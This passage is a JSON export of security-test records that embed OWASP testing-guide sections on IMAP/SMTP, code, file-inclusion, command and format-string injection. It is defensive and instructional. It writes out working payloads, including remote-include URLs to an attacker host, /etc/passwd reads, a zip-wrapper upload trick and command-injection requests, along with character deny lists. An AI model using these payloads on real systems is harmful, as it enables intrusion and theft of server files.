[RFC](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/10-Testing_for_IMAP_SMTP_Injection#references) allows the tester to understand what other possible commands can be executed.\nIf the application does not return descriptive error messages, the tester needs to analyze the affected functionality to deduce all the possible commands (and parameters) associated with the above mentioned functionality. For example, if a vulnerable parameter has been detected in the create mailbox functionality, it is logical to assume that the affected IMAP command is \u0060CREATE\u0060. According to the RFC, the \u0060CREATE\u0060 command accepts one parameter which specifies the name of the mailbox to create.\n\n\u003E List of IMAP/SMTP commands affected\n\u003E\n\u003E * Type, value, and number of parameters expected by the affected IMAP/SMTP commands\n\n### IMAP/SMTP Command Injection\n\nOnce the tester has identified vulnerable parameters and has analyzed the context in which they are executed, the next stage is exploiting the functionality.\nThis stage has two possible outcomes:\n\n1. The injection is possible in an unauthenticated state: the affected functionality does not require the user to be authenticated. The injected (IMAP) commands available are limited to: \u0060CAPABILITY\u0060, \u0060NOOP\u0060, \u0060AUTHENTICATE\u0060, \u0060LOGIN\u0060, and \u0060LOGOUT\u0060.\n2. The injection is only possible in an authenticated state: the successful exploitation requires the user to be fully authenticated before testing can continue.\n\nIn any case, the typical structure of an IMAP/SMTP Injection is as follows:\n\n* Header: ending of the expected command;\n* Body: injection of the new command;\n* Footer: beginning of the expected command.\n\nIt is important to remember that, in order to execute an IMAP/SMTP command, the previous command must be terminated with the CRLF (\u0060%0d%0a\u0060) sequence.\nLet\u2019s suppose that in the [Identifying vulnerable parameters](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/10-Testing_for_IMAP_SMTP_Injection#identifying-vulnerable-parameters) stage, the attacker detects that the parameter \u0060message_id\u0060 in the following request is vulnerable:\n\u0060http://\u003Cwebmail\u003E/read_email.php?message_id=4791\u0060\nLet\u2019s suppose also that the outcome of the analysis performed in the stage 2 (\u201CUnderstanding the data flow and deployment structure of the client\u201D) has identified the command and arguments associated with this parameter as:\n\u0060FETCH 4791 BODY[HEADER]\u0060\nIn this scenario, the IMAP injection structure would be:\n\u0060http://\u003Cwebmail\u003E/read_email.php?message_id=4791 BODY[HEADER]%0d%0aV100 CAPABILITY%0d%0aV101 FETCH 4791\u0060\nWhich would generate the following commands:\n\n\u0060\u0060\u0060\n???? FETCH 4791 BODY[HEADER]\nV100 CAPABILITY\nV101 FETCH 4791 BODY[HEADER]\n\u0060\u0060\u0060\n\nwhere:\n\n\u0060\u0060\u0060\nHeader = 4791 BODY[HEADER]\nBody   = %0d%0aV100 CAPABILITY%0d%0a\nFooter = V101 FETCH 4791\n\u0060\u0060\u0060\n\n\u003E List of IMAP/SMTP commands affected\n\u003E\n\u003E * Arbitrary IMAP/SMTP command injection","Details":null,"Implication":null,"Recommendation":null,"References":"* [RFC 0821 \u201CSimple Mail Transfer Protocol\u201D](https://tools.ietf.org/html/rfc821)\n* [RFC 3501 \u201CInternet Message Access Protocol - Version 4rev1\u201D](https://tools.ietf.org/html/rfc3501)\n* [Vicente Aguilera D\u00EDaz: \u201CMX Injection: Capturing and Exploiting Hidden Mail Servers\u201D](http://www.webappsec.org/projects/articles/121106.pdf)","Reference":null,"Vendor":"OWASP","Product":"OWASP","Base":0,"Environmental":0,"Temporal":0,"ScoreVersion":null,"Attributes":{"tested_by":"Anonymous","hours_to_find":"1","risk":"10","logged_in":"SaltMiner","comments":"","fix_by":"6/26/2024","approvers":"Grace Hopper","influencers":"[]"}},"Asset":{"AppVersion":"3.0.1","Name":"07-Input Validation Testing","Description":"07-Input Validation Testing","VersionId":"1","Version":"1","Host":null,"Ip":null,"Scheme":null,"Port":0,"SourceId":"67f3ee4c-3f91-4951-b403-c7ad60889758","Attributes":{"physical_address":"555 Somewhere Dr\nAnywhere, CA 55555","last_deployed":"6/12/2024","owner":"Grace Hopper","dev_team":"[\u0022Johann Gutenberg\u0022]","up_days":"10","business_unit":"Testing Methodology","budget":"10000"}}},{"Issue":{"AppVersion":"3.0.1","Name":"WSTG-INPV-11 Testing for Code Injection","Severity":"High","FoundDate":"2024-06-26T00:00:00","TestStatus":"Not Tested","IsSuppressed":false,"IsFiltered":false,"RemovedDate":null,"Location":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11-Testing_for_Code_Injection","LocationFull":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11-Testing_for_Code_Injection","ReportId":"39f792bf-9347-41d0-a444-d009ba0c8bf2","Category":["Application"],"Classification":null,"Description":null,"Audited":false,"Auditor":null,"LastAudit":null,"Enumeration":null,"Proof":"## Summary\n\nThis section describes how a tester can check if it is possible to enter code as input on a web page and have it executed by the web server.\nIn [Code Injection](https://owasp.org/www-community/attacks/Code_Injection) testing, a tester submits input that is processed by the web server as dynamic code or as an included file. These tests can target various server-side scripting engines, e.g., ASP or PHP. Proper input validation and secure coding practices need to be employed to protect against these attacks.\n\n\u003Cbr\u003E\n","TestingInstructions":"## Test Objectives\n\n* Identify injection points where you can inject code into the application.\n* Assess the injection severity.\n\n## How to Test\n\n### Black-Box Testing\n\n#### Testing for PHP Injection Vulnerabilities\n\nUsing the querystring, the tester can inject code (in this example, a malicious URL) to be processed as part of the included file:\n\u0060http://www.example.com/uptime.php?pin=http://www.example2.com/packx1/cs.jpg?\u0026cmd=uname%20-a\u0060\n\n\u003E The malicious URL is accepted as a parameter for the PHP page, which will later use the value in an included file.\n\n### Gray-Box Testing\n\n#### Testing for ASP Code Injection Vulnerabilities\n\nExamine ASP code for user input used in execution functions. Can the user enter commands into the Data input field? Here, the ASP code will save the input to a file and then execute it:\n\n\u0060\u0060\u0060\n\u003C%\nIf\u00A0not\u00A0isEmpty(Request(\u00A0\u0022Data\u0022\u00A0)\u00A0)\u00A0Then\nDim\u00A0fso,\u00A0f\n\u0027User\u00A0input\u00A0Data\u00A0is\u00A0written\u00A0to\u00A0a\u00A0file\u00A0named\u00A0data.txt\nSet\u00A0fso\u00A0=\u00A0CreateObject(\u0022Scripting.FileSystemObject\u0022)\nSet\u00A0f\u00A0=\u00A0fso.OpenTextFile(Server.MapPath(\u00A0\u0022data.txt\u0022\u00A0),\u00A08,\u00A0True)\nf.Write\u00A0Request(\u0022Data\u0022)\u00A0\u0026\u00A0vbCrLf\nf.close\nSet\u00A0f\u00A0=\u00A0nothing\nSet\u00A0fso\u00A0=\u00A0Nothing\n\n\u0027Data.txt\u00A0is\u00A0executed\nServer.Execute(\u00A0\u0022data.txt\u0022\u00A0)\n\nElse\n%\u003E\n\n\u003Cform\u003E\n\u003Cinput name=\u0022Data\u0022 /\u003E\u003Cinput type=\u0022submit\u0022 name=\u0022Enter Data\u0022 /\u003E\n\n\u003C/form\u003E\n\u003C%\nEnd\u00A0If\n%\u003E)))\n\u0060\u0060\u0060","Details":null,"Implication":null,"Recommendation":null,"References":"* [Security Focus](http://www.securityfocus.com/)\n* [Insecure.org](http://www.insecure.org/)\n* [Wikipedia](https://www.wikipedia.org/)\n* [Reviewing Code for OS Injection](https://wiki.owasp.org/index.php/OS_Injection)","Reference":null,"Vendor":"OWASP","Product":"OWASP","Base":0,"Environmental":0,"Temporal":0,"ScoreVersion":null,"Attributes":{"tested_by":"Anonymous","hours_to_find":"1","risk":"10","logged_in":"SaltMiner","comments":"","fix_by":"6/26/2024","approvers":"Grace Hopper","influencers":"[]","developer_note":""}},"Asset":{"AppVersion":"3.0.1","Name":"07-Input Validation Testing","Description":"07-Input Validation Testing","VersionId":"1","Version":"1","Host":null,"Ip":null,"Scheme":null,"Port":0,"SourceId":"67f3ee4c-3f91-4951-b403-c7ad60889758","Attributes":{"physical_address":"555 Somewhere Dr\nAnywhere, CA 55555","last_deployed":"6/12/2024","owner":"Grace Hopper","dev_team":"[\u0022Johann Gutenberg\u0022]","up_days":"10","business_unit":"Testing Methodology","budget":"10000"}}},{"Issue":{"AppVersion":"3.0.1","Name":"WSTG-INPV-11-1 Testing for File Inclusion","Severity":"High","FoundDate":"2024-06-27T00:00:00","TestStatus":"Not Tested","IsSuppressed":false,"IsFiltered":false,"RemovedDate":null,"Location":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_File_Inclusion","LocationFull":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_File_Inclusion","ReportId":"39f792bf-9347-41d0-a444-d009ba0c8bf2","Category":["Application"],"Classification":null,"Description":null,"Audited":false,"Auditor":null,"LastAudit":null,"Enumeration":null,"Proof":"The File Inclusion vulnerability allows an attacker to include a file, usually exploiting a \u201Cdynamic file inclusion\u201D mechanism implemented in the target application. The vulnerability occurs due to the use of user-supplied input without proper validation.\nThis can lead to something as simple as outputting the contents of the file, but it can also lead to:\n\n* Code execution on the web server\n* Code execution on the client-side such as JavaScript which can lead to other attacks such as cross site scripting (XSS)\n* Denial of Service (DoS)\n* Sensitive Information Disclosure\n\nLocal File Inclusion (LFI) is the process of including files that are already present on the server through exploitation of vulnerable inclusion procedures implemented in the application. For example, this vulnerability occurs when a page receives input that is a path to a local file. This input is not properly sanitized, allowing directory traversal characters to be injected (such as \u0060../\u0060 \u2013 see 4.5.1 [Testing Directory Traversal File Include](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/01-Testing_Directory_Traversal_File_Include)).\nRemote File Inclusion (RFI) is the process of including files from remote sources through exploitation of vulnerable inclusion procedures implemented in the application. For example, this vulnerability occurs when a page receives input that is the URL to a remote file. This input is not properly sanitized, allowing external URLs to be injected.\nIn both cases, although most examples point to vulnerable PHP scripts, we should keep in mind that it is also common in other technologies such as JSP, ASP, etc.","TestingInstructions":"## Test Objectives\n\n* Identify file inclusion points.\n* Assess the severity or potential impact of the vulnerabilities.\n\n## How to Test\n\n### Testing for Local File Inclusion\n\nSince LFI occurs when paths passed to \u0060include\u0060 statements are not properly sanitized, in a black-box testing approach, we should look for functionality that accepts file names/paths as parameters.\nConsider the following example:\n\u0060http://vulnerable_host/preview.php?file=example.html\u0060\nThis looks to be a promising place to try LFI. If the application does not select the appropriate page given in the \u0060file\u0060 parameter and instead directly includes the input, it is possible to include arbitrary files from the server.\nA typical proof-of-concept exploit would be to attempt to load the \u0060passwd\u0060 file with:\n\u0060http://vulnerable_host/preview.php?file=../../../../etc/passwd\u0060\nIf the above mentioned conditions are met, an attacker would see something like the following included in the response:\n\n\u0060\u0060\u0060\nroot:x:0:0:root:/root:/bin/bash\nbin:x:1:1:bin:/bin:/sbin/nologin\ndaemon:x:2:2:daemon:/sbin:/sbin/nologin\nalex:x:500:500:alex:/home/alex:/bin/bash\nmargo:x:501:501::/home/margo:/bin/bash\n...\n\u0060\u0060\u0060\n\nEven when such a vulnerability exists, its exploitation could be more complex in real life scenarios. Consider the following piece of code:\n\n\u0060\u0060\u0060\n\u003C?php include($_GET[\u0027file\u0027].\u0022.php\u0022); ?\u003E\n\u0060\u0060\u0060\n\nSimple substitution with a random filename would not work as the postfix \u0060.php\u0060 is appended to the provided input. In order to bypass it, a tester can use several techniques to get the expected exploitation.\n\n#### Null Byte Injection\n\nThe \u0060null character\u0060 (also known as \u0060null terminator\u0060 or \u0060null byte\u0060) is a control character with the value zero present in many character sets that is being used as a reserved character to mark the end of a string. Once used, any character after this special byte will be ignored. Commonly the way to inject this character would be with the URL encoded string \u0060%00\u0060 by appending it to the requested path. In our previous sample, performing a request to \u0060http://vulnerable_host/preview.php?file=../../../../etc/passwd%00\u0060 would ignore the \u0060.php\u0060 extension being added to the input filename, returning to an attacker a list of basic users as a result of a successful exploitation.\n\n#### Path and Dot Truncation\n\nMost PHP installations have a filename limit of 4096 bytes. If any given filename is longer than that length, PHP simply truncates it, discarding any additional characters. Abusing this behavior makes it possible to make the PHP engine ignore the \u0060.php\u0060 extension by moving it out of the 4096 bytes limit. When this happens, no error is triggered; the additional characters are simply dropped and PHP continues its execution normally.\nThis bypass would commonly be combined with other logic bypass strategies such as encoding part of the file path with Unicode encoding, the introduction of double encoding, or any other input that would still represent the valid desired filename.\n\n#### PHP Wrappers\n\nLocal File Inclusion vulnerabilities are commonly seen as read only vulnerabilities that an attacker can use to read sensitive data from the server hosting the vulnerable application. However, in some specific implementations this vulnerability can be used to upgrade the attack [from LFI to Remote Code Execution](https://www.corben.io/zip-to-rce-lfi/) vulnerabilities that could potentially fully compromise the host.\nThis enhancement is common when an attacker could be able to combine the [LFI vulnerability with certain PHP wrappers](https://www.netsparker.com/blog/web-security/php-stream-wrappers/).\nA wrapper is a code that surrounds other code to perform some added functionality. PHP implements many [built-in wrappers](https://www.php.net/manual/en/wrappers.php) to be used with file system functions. Once their usage is detected during the testing process of an application, it\u2019s a good practice to try to abuse it to identify the real risk of the detected weakness(es). Below is a list with the most commonly used wrappers, even though you should consider that it is not exhaustive and at the same time it is possible to register custom wrappers that if employed by the target, would require a deeper adhoc analysis.\n\n##### PHP Filter\n\nUsed to access the local file system; this is a case insensitive wrapper that provides the capability to apply filters to a stream at the time of opening a file. This wrapper can be used to get content of a file preventing the server from executing it. For example, allowing an attacker to read the content of PHP files to get source code to identify sensitive information such as credentials or other exploitable vulnerabilities.\nThe wrapper can be used like \u0060php://filter/convert.base64-encode/resource=FILE\u0060 where \u0060FILE\u0060 is the file to retrieve. As a result of the usage of this execution, the content of the target file would be read, encoded to base64 (this is the step that prevents the execution server-side), and returned to the User-Agent.\n\n##### PHP ZIP\n\nIn PHP 7.2.0, the \u0060zip://\u0060 wrapper was introduced to manipulate \u0060zip\u0060 compressed files. This wrapper expects the following parameter structure: \u0060zip:///filename_path#internal_filename\u0060. The \u0060filename_path\u0060 is the path to the malicious ZIP archive and \u0060internal_filename\u0060 is the path of the malicious file placed inside the processed ZIP file. During the exploitation, it\u2019s common that the \u0060#\u0060 would be encoded with its URL encoded value \u0060%23\u0060.\nAbuse of this wrapper could allow an attacker to design a malicious ZIP file that could be uploaded to the server, for example as an avatar image or using any file upload system available on the target site (the \u0060php:zip://\u0060 wrapper does not require the ZIP file to have any specific extension) to be executed by the LFI vulnerability.\nIn order to test this vulnerability, the following procedure could be followed to attack the previous code example provided.\n\n1. Create the PHP file to be executed, for example with the content \u0060\u003C?php phpinfo(); ?\u003E\u0060 and save it as \u0060code.php\u0060.\n2. Compress it as a new ZIP file called \u0060target.zip\u0060.\n3. Rename the \u0060target.zip\u0060 file to \u0060target.jpg\u0060 to bypass the extension validation and upload it to the target website as your avatar image.\n4. Supposing that the \u0060target.jpg\u0060 file is stored locally on the server to the \u0060../avatar/target.jpg\u0060 path, exploit the vulnerability with the PHP ZIP wrapper by injecting the following payload to the vulnerable URL: \u0060zip://../avatar/target.jpg%23code\u0060 (remember that \u0060%23\u0060 corresponds to \u0060#\u0060).\n\nSince on our sample the \u0060.php\u0060 extension is concatenated to our payload, the request to \u0060http://vulnerable_host/preview.php?file=zip://../avatar/target.jpg%23code\u0060 will result in the execution of the \u0060code.php\u0060 file existing in the malicious ZIP file.\n\n##### PHP Data\n\nAvailable since PHP 5.2.0, this wrapper expects the following usage: \u0060data://text/plain;base64,BASE64_STR\u0060 where \u0060BASE64_STR\u0060 is expected to be the base64 encoded content of the file to be processed. It\u2019s important to consider that this wrapper would only be available if the option \u0060allow_url_include\u0060 would be enabled.\nIn order to test for LFI using this wrapper, the code to be executed should be base64 encoded. For example, \u0060\u003C?php phpinfo(); ?\u003E\u0060 would be encoded as: \u0060PD9waHAgcGhwaW5mbygpOyA/Pg==\u0060 and the payload would be represented as: \u0060data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==\u0060.\n\n##### PHP Expect\n\nThis wrapper, which is not enabled by default, provides access to processes \u0060stdio\u0060, \u0060stdout\u0060, and \u0060stderr\u0060. Given in the format \u0060expect://command\u0060, the server would execute the provided command using \u0060BASH\u0060 and return the result.\n\n### Testing for Remote File Inclusion\n\nSince RFI occurs when URLs passed to \u0060include\u0060 statements are not properly sanitized, in a black-box testing approach, we should look for scripts that take filenames as parameters. Consider the following PHP example:\n\n\u0060\u0060\u0060\n$incfile = $_REQUEST[\u0022file\u0022];\ninclude($incfile.\u0022.php\u0022);\n\u0060\u0060\u0060\n\nIn this example the path is extracted from the HTTP request and no input validation is done (for example, by checking the input against an allow list), so this snippet of code is vulnerable to this type of attack. Consider the following URL:\n\u0060http://vulnerable_host/vuln_page.php?file=http://attacker_site/malicous_page\u0060\nIn this case the remote file is going to be included and any code contained in it is going to be run by the server.\n\n## \n\n## Tools\n\n* [kadimus](https://github.com/P0cL4bs/Kadimus)\n* [LFI Suite](https://github.com/D35m0nd142/LFISuite)\n* [Zed Attack Proxy (ZAP)](https://www.zaproxy.org/)","Details":null,"Implication":null,"Recommendation":"## Remediation\n\nThe most effective solution to eliminate file inclusion vulnerabilities is to avoid passing user-submitted input to any filesystem/framework API. If this is not possible, the application can maintain an allow list of files that may be included by the page, and then use an identifier (for example, the index number) to access the selected file. Any request containing an invalid identifier should be rejected so that there is no opportunity for malicious users to manipulate the path. Check out the [File Upload Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html) for good security practices on this topic.","References":"* [Wikipedia](https://www.wikipedia.org/wiki/Local_File_Inclusion)\n* [Null character](https://en.wikipedia.org/wiki/Null_character)\n* [Unicode Encoding](https://owasp.org/www-community/attacks/Unicode_Encoding)\n* [Double Encoding](https://owasp.org/www-community/Double_Encoding)\n* [PHP Supported Protocols and Wrappers](https://www.php.net/manual/en/wrappers.php)\n* [RFC 2397 - The \u201Cdata\u201D URL scheme](http://www.faqs.org/rfcs/rfc2397.html)\n* [\u201CRemote File Inclusion\u201D](http://projects.webappsec.org/w/page/13246955/Remote%20File%20Inclusion)\n* [Wikipedia: \u201CRemote File Inclusion\u201D](https://en.wikipedia.org/wiki/Remote_File_Inclusion)","Reference":null,"Vendor":"OWASP","Product":"OWASP","Base":0,"Environmental":0,"Temporal":0,"ScoreVersion":null,"Attributes":{"tested_by":"Anonymous","hours_to_find":"1","risk":"10","logged_in":"SaltMiner","comments":"","fix_by":"6/27/2024","approvers":"Grace Hopper","influencers":"[]"}},"Asset":{"AppVersion":"3.0.1","Name":"07-Input Validation Testing","Description":"07-Input Validation Testing","VersionId":"1","Version":"1","Host":null,"Ip":null,"Scheme":null,"Port":0,"SourceId":"67f3ee4c-3f91-4951-b403-c7ad60889758","Attributes":{"physical_address":"555 Somewhere Dr\nAnywhere, CA 55555","last_deployed":"6/12/2024","owner":"Grace Hopper","dev_team":"[\u0022Johann Gutenberg\u0022]","up_days":"10","business_unit":"Testing Methodology","budget":"10000"}}},{"Issue":{"AppVersion":"3.0.1","Name":"WSTG-INPV-12 Testing for Command Injection","Severity":"High","FoundDate":"2024-06-26T00:00:00","TestStatus":"Not Tested","IsSuppressed":false,"IsFiltered":false,"RemovedDate":null,"Location":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/12-Testing_for_Command_Injection","LocationFull":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/12-Testing_for_Command_Injection","ReportId":"39f792bf-9347-41d0-a444-d009ba0c8bf2","Category":["Application"],"Classification":null,"Description":null,"Audited":false,"Auditor":null,"LastAudit":null,"Enumeration":null,"Proof":"## Summary\n\nThis article describes how to test an application for OS command injection. The tester will try to inject an OS command through an HTTP request to the application.\nOS command injection is a technique used via a web interface in order to execute OS commands on a web server. The user supplies operating system commands through a web interface in order to execute OS commands. Any web interface that is not properly sanitized is subject to this exploit. With the ability to execute OS commands, the user can upload malicious programs or even obtain passwords. OS command injection is preventable when security is emphasized during the design and development of applications","TestingInstructions":"## Test Objectives\n\n* Identify and assess the command injection points.\n\n## How to Test\n\nWhen viewing a file in a web application, the filename is often shown in the URL. Perl allows piping data from a process into an open statement. The user can simply append the Pipe symbol \u0060|\u0060 onto the end of the filename.\nExample URL before alteration:\n\u0060http://sensitive/cgi-bin/userData.pl?doc=user1.txt\u0060\nExample URL modified:\n\u0060http://sensitive/cgi-bin/userData.pl?doc=/bin/ls|\u0060\nThis will execute the command \u0060/bin/ls\u0060.\nAppending a semicolon to the end of a URL for a .PHP page followed by an operating system command, will execute the command. \u0060%3B\u0060 is URL encoded and decodes to semicolon\nExample:\n\u0060http://sensitive/something.php?dir=%3Bcat%20/etc/passwd\u0060\n\n### Example\n\nConsider the case of an application that contains a set of documents that you can browse from the Internet. If you fire up a personal proxy (such as ZAP or Burp Suite), you can obtain a POST HTTP like the following (\u0060http://www.example.com/public/doc\u0060):\n\n\u0060\u0060\u0060\nPOST /public/doc HTTP/1.1\nHost: www.example.com\n[...]\nReferer: http://127.0.0.1/WebGoat/attack?Screen=20\nCookie: JSESSIONID=295500AD2AAEEBEDC9DB86E34F24A0A5\nAuthorization: Basic T2Vbc1Q9Z3V2Tc3e=\nContent-Type: application/x-www-form-urlencoded\nContent-length: 33\n\nDoc=Doc1.pdf\n\u0060\u0060\u0060\n\nIn this post request, we notice how the application retrieves the public documentation. Now we can test if it is possible to add an operating system command to inject in the POST HTTP. Try the following (\u0060http://www.example.com/public/doc\u0060):\n\n\u0060\u0060\u0060\nPOST /public/doc HTTP/1.1\nHost: www.example.com\n[...]\nReferer: http://127.0.0.1/WebGoat/attack?Screen=20\nCookie: JSESSIONID=295500AD2AAEEBEDC9DB86E34F24A0A5\nAuthorization: Basic T2Vbc1Q9Z3V2Tc3e=\nContent-Type: application/x-www-form-urlencoded\nContent-length: 33\n\nDoc=Doc1.pdf\u002B|\u002BDir c:\\\n\u0060\u0060\u0060\n\nIf the application doesn\u2019t validate the request, we can obtain the following result:\n\n\u0060\u0060\u0060\n    Exec Results for \u0027cmd.exe /c type \u0022C:\\httpd\\public\\doc\\\u0022Doc=Doc1.pdf\u002B|\u002BDir c:\\\u0027\n    Output...\n    Il volume nell\u0027unit\u00E0 C non ha etichetta.\n    Numero di serie Del volume: 8E3F-4B61\n    Directory of c:\\\n     18/10/2006 00:27 2,675 Dir_Prog.txt\n     18/10/2006 00:28 3,887 Dir_ProgFile.txt\n     16/11/2006 10:43\n        Doc\n        11/11/2006 17:25\n           Documents and Settings\n           25/10/2006 03:11\n              I386\n              14/11/2006 18:51\n             h4ck3r\n             30/09/2005 21:40 25,934\n            OWASP1.JPG\n            03/11/2006 18:29\n                Prog\n                18/11/2006 11:20\n                    Program Files\n                    16/11/2006 21:12\n                        Software\n                        24/10/2006 18:25\n                            Setup\n                            24/10/2006 23:37\n                                Technologies\n                                18/11/2006 11:14\n                                3 File 32,496 byte\n                                13 Directory 6,921,269,248 byte disponibili\n                                Return code: 0\n\u0060\u0060\u0060\n\nIn this case, we have successfully performed an OS injection attack.\n\n## Special Characters for Command Injection\n\nThe following special character can be used for command injection such as \u0060|\u0060 \u0060;\u0060 \u0060\u0026\u0060 \u0060$\u0060 \u0060\u003E\u0060 \u0060\u003C\u0060 \u0060\u0027\u0060 \u0060!\u0060\n\n* \u0060cmd1|cmd2\u0060 : Uses of \u0060|\u0060 will make command 2 to be executed whether command 1 execution is successful or not.\n* \u0060cmd1;cmd2\u0060 : Uses of \u0060;\u0060 will make command 2 to be executed whether command 1 execution is successful or not.\n* \u0060cmd1||cmd2\u0060 : Command 2 will only be executed if command 1 execution fails.\n* \u0060cmd1\u0026\u0026cmd2\u0060 : Command 2 will only be executed if command 1 execution succeeds.\n* \u0060$(cmd)\u0060 : For example, \u0060echo $(whoami)\u0060 or \u0060$(touch test.sh; echo \u0027ls\u0027 \u003E test.sh)\u0060\n* \u0060cmd\u0060 : It\u2019s used to execute a specific command. For example, \u0060whoami\u0060\n* \u0060\u003E(cmd)\u0060: \u0060\u003E(ls)\u0060\n* \u0060\u003C(cmd)\u0060: \u0060\u003C(ls)\u0060\n\n## Code Review Dangerous API\n\nBe aware of the uses of following API as it may introduce the command injection risks.\n\n### Java\n\n* \u0060Runtime.exec()\u0060\n\n### C/C\u002B\u002B\n\n* \u0060system\u0060\n* \u0060exec\u0060\n* \u0060ShellExecute\u0060\n\n### Python\n\n* \u0060exec\u0060\n* \u0060eval\u0060\n* \u0060os.system\u0060\n* \u0060os.popen\u0060\n* \u0060subprocess.popen\u0060\n* \u0060subprocess.call\u0060\n\n### PHP\n\n* \u0060system\u0060\n* \u0060shell_exec\u0060\n* \u0060exec\u0060\n* \u0060proc_open\u0060\n* \u0060eval\u0060\n\n## Tools\n\n* OWASP [WebGoat](https://owasp.org/www-project-webgoat/)\n* [Commix](https://github.com/commixproject/commix)","Details":null,"Implication":null,"Recommendation":"## Remediation\n\n### Sanitization\n\nThe URL and form data needs to be sanitized for invalid characters. A deny list of characters is an option but it may be difficult to think of all of the characters to validate against. Also there may be some that were not discovered as of yet. An allow list containing only allowable characters or command list should be created to validate the user input. Characters that were missed, as well as undiscovered threats, should be eliminated by this list.\nGeneral deny list to be included for command injection can be \u0060|\u0060 \u0060;\u0060 \u0060\u0026\u0060 \u0060$\u0060 \u0060\u003E\u0060 \u0060\u003C\u0060 \u0060\u0027\u0060 \u0060\\\u0060 \u0060!\u0060 \u0060\u003E\u003E\u0060 \u0060#\u0060\nEscape or filter special characters for windows, \u00A0 \u0060(\u0060 \u0060)\u0060 \u0060\u003C\u0060 \u0060\u003E\u0060 \u0060\u0026\u0060 \u0060*\u0060 \u0060\u2018\u0060 \u0060|\u0060 \u0060=\u0060 \u0060?\u0060 \u0060;\u0060 \u0060[\u0060 \u0060]\u0060 \u0060^\u0060 \u0060~\u0060 \u0060!\u0060 \u0060.\u0060 \u0060\u0022\u0060 \u0060%\u0060 \u0060@\u0060 \u0060/\u0060 \u0060\\\u0060 \u0060:\u0060\u00A0\u0060\u002B\u0060 \u0060,\u0060 \u0060\u0060 \u0060 \u0060\u0060 Escape or filter special characters for Linux, \u0060{\u0060 \u0060}\u0060 \u0060(\u0060 \u0060)\u0060 \u0060\u003E\u0060 \u0060\u003C\u0060 \u0060\u0026\u0060 \u0060*\u0060 \u0060\u2018\u0060 \u0060|\u0060 \u0060=\u0060 \u0060?\u0060 \u0060;\u0060 \u0060[\u0060 \u0060]\u0060\u00A0\u0060$\u0060 \u0060\u2013\u0060 \u0060#\u0060\u00A0\u0060~\u0060 \u0060!\u0060 \u0060.\u0060 \u0060\u0022\u0060 \u0060%\u0060\u00A0 \u0060/\u0060 \u0060\\\u0060 \u0060:\u0060\u00A0\u0060\u002B\u0060 \u0060,\u0060 \u0060\u0060 \u0060 \u0060\u0060\n\n### Permissions\n\nThe web application and its components should be running under strict permissions that do not allow operating system command execution. Try to verify all this information to test from a gray-box testing point of view.","References":"* [Penetration Testing for Web Applications (Part Two)](https://www.symantec.com/connect/articles/penetration-testing-web-applications-part-two)\n* [OS Commanding](http://projects.webappsec.org/w/page/13246950/OS%20Commanding)\n* [CWE-78: Improper Neutralization of Special Elements used in an OS Command (\u2018OS Command Injection\u2019)](https://cwe.mitre.org/data/definitions/78.html)\n* [ENV33-C. Do not call system()](https://wiki.sei.cmu.edu/confluence/pages/viewpage.action?pageId=87152177)","Reference":null,"Vendor":"OWASP","Product":"OWASP","Base":0,"Environmental":0,"Temporal":0,"ScoreVersion":null,"Attributes":{"tested_by":"Anonymous","hours_to_find":"1","risk":"10","logged_in":"SaltMiner","comments":"","fix_by":"6/26/2024","approvers":"Grace Hopper","influencers":"[]"}},"Asset":{"AppVersion":"3.0.1","Name":"07-Input Validation Testing","Description":"07-Input Validation Testing","VersionId":"1","Version":"1","Host":null,"Ip":null,"Scheme":null,"Port":0,"SourceId":"67f3ee4c-3f91-4951-b403-c7ad60889758","Attributes":{"physical_address":"555 Somewhere Dr\nAnywhere, CA 55555","last_deployed":"6/12/2024","owner":"Grace Hopper","dev_team":"[\u0022Johann Gutenberg\u0022]","up_days":"10","business_unit":"Testing Methodology","budget":"10000"}}},{"Issue":{"AppVersion":"3.0.1","Name":"WSTG-INPV-13 Testing for Format String Injection","Severity":"High","FoundDate":"2024-06-26T00:00:00","TestStatus":"Not Tested","IsSuppressed":false,"IsFiltered":false,"RemovedDate":null,"Location":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/13-Testing_for_Format_String_Injection","LocationFull":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/13-Testing_for_Format_String_Injection","ReportId":"39f792bf-9347-41d0-a444-d009ba0c8bf2","Category":["Application"],"Classification":null,"Description":null,"Audited":false,"Auditor":null,"LastAudit":null,"Enumeration":null,"Proof":"## Summary\n\nA format string is a null-terminated character sequence that also contains conversion specifiers interpreted or converted at runtime. If server-side code [concatenates a user\u2019s input with a format string](https://www.netsparker.com/blog/web-security/string-concatenation-format-string-vulnerabilities/), an attacker can append additional conversion specifiers to cause a runtime error, information disclosure, or buffer overflow.\nThe worst case for format strings vulnerabilities occur in languages that don\u2019t check arguments and also include a \u0060%n\u0060 specifier that writes to memory. These functions, if exploited by an attacker modifying a format string, could cause [information disclosure and code execution](https://www.veracode.com/security/format-string):\n\n* C and C\u002B\u002B [printf](https://en.cppreference.com/w/c/io/fprintf) and similar methods fprintf, sprintf, snprintf\n* Perl [printf](https://perldoc.perl.org/functions/printf.html) and sprintf\n\nThese format string functions cannot write to memory, but attackers can still cause information disclosure by changing format strings to output values the developers did not intend to send:\n\n* Python 2.6 and 2.7 [str.format](https://docs.python.org/2/library/string.html) and Python 3 unicode [str.format](https://docs.python.org/3/library/stdtypes.html#str.format) can be modified by injecting strings that can point to [other variables](https://lucumr.pocoo.org/2016/12/29/careful-with-str-format/) in 